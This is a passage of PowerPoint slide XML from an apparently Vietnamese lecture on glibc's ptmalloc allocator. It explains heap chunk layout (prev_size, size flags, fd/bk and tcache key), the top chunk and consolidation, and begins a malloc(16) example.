                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>mmap()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> cấp vùng lớn riêng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Không có khái niệm "chunk" ở tầng này — chỉ là vùng nhớ thô</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="1417320"/>
            <a:ext cx="5522976" cy="3749040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1951"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="1581912"/>
            <a:ext cx="5157216"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MỤC 3 · GLIBC (ptmalloc), USER-SPACE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="1874520"/>
            <a:ext cx="5157216" cy="77724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Chia vùng đó thành heap chunk</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="2697480"/>
            <a:ext cx="5157216" cy="2359152"/>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chemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chạy hoàn toàn trong tiến trình, không đặc quyền kernel</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Mỗi lần </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>malloc()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>calloc()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>realloc()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> được đóng gói thành một chunk = metadata + user data (mục 3.1), không lưu thuần dữ liệu người dùng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="5349240"/>
            <a:ext cx="11274552" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5513832"/>
            <a:ext cx="10908792" cy="640080"/>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Cùng một ranh giới như mục 2, áp cho tầng chunk: việc chia nhỏ vùng OS cấp cho từng lần malloc() là công việc của thư viện glibc, không phải OS.</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Cấu trúc một heap chunk</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3.1 · CHUNK = METADATA + USER DATA</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5669280" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1524"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="1600200"/>
            <a:ext cx="2377440" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Allocated chunk</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3474720" y="1600200"/>
            <a:ext cx="2377440" cy="274320"/>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Freed chunk</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="1965960"/>
            <a:ext cx="2377440" cy="45720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prev_size</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="2423160"/>
            <a:ext cx="2377440" cy="45720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size | A|M|P</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="2880360"/>
            <a:ext cx="2377440" cy="228600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User Data</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>(payload)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3474720" y="1965960"/>
            <a:ext cx="2377440" cy="45720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prev_size</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3474720" y="2423160"/>
            <a:ext cx="2377440" cy="45720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size | A|M|P</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3474720" y="2880360"/>
            <a:ext cx="2377440" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>fd (tcache: next)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3474720" y="3429000"/>
            <a:ext cx="2377440" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>bk (tcache: key)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3474720" y="3977640"/>
            <a:ext cx="2377440" cy="118872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100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>unused...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="5349240"/>
            <a:ext cx="5120640" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>mem = chunk + 0x10: con trỏ malloc() trả về trỏ vào user data; key có từ glibc 2.29</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6355080" y="1417320"/>
            <a:ext cx="5376672" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2424"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6537960" y="1581912"/>
            <a:ext cx="501091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CÁC TRƯỜNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6537960" y="1874520"/>
            <a:ext cx="5010912" cy="2450592"/>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chemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>prev_size</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: cỡ chunk liền trước, chỉ có nghĩa khi chunk đó rảnh (bit P = 0)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>size</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: tính cả header 0x10, bội số của 16, tối thiểu 0x20 (64-bit)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3 bit cờ: </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>P</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> PREV_INUSE · </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>M</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> IS_MMAPPED · </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>A</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> NON_MAIN_ARENA</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="700"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Khi free, 16 byte đầu user data thành </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>fd</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>next</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> và </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>bk</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>key</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6355080" y="4663440"/>
            <a:ext cx="2574036" cy="1554480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4706"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6537960" y="4828032"/>
            <a:ext cx="220827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TOP CHUNK</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6537960" y="5120640"/>
            <a:ext cx="2208276" cy="98755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Chunk trống cuối heap; malloc cắt dần, hết thì mở rộng bằng brk/mmap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9157716" y="4663440"/>
            <a:ext cx="2574036" cy="1554480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4706"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9340596" y="4828032"/>
            <a:ext cx="220827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CONSOLIDATION</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9340596" y="5120640"/>
            <a:ext cx="2208276" cy="98755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Free chunk kề chunk rảnh khác (hoặc top) thì gộp thành chunk lớn hơn</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malloc() cấp phát trên heap như thế nào</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3.2 · VÍ DỤ TỐI GIẢN: BA LẦN malloc(16)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
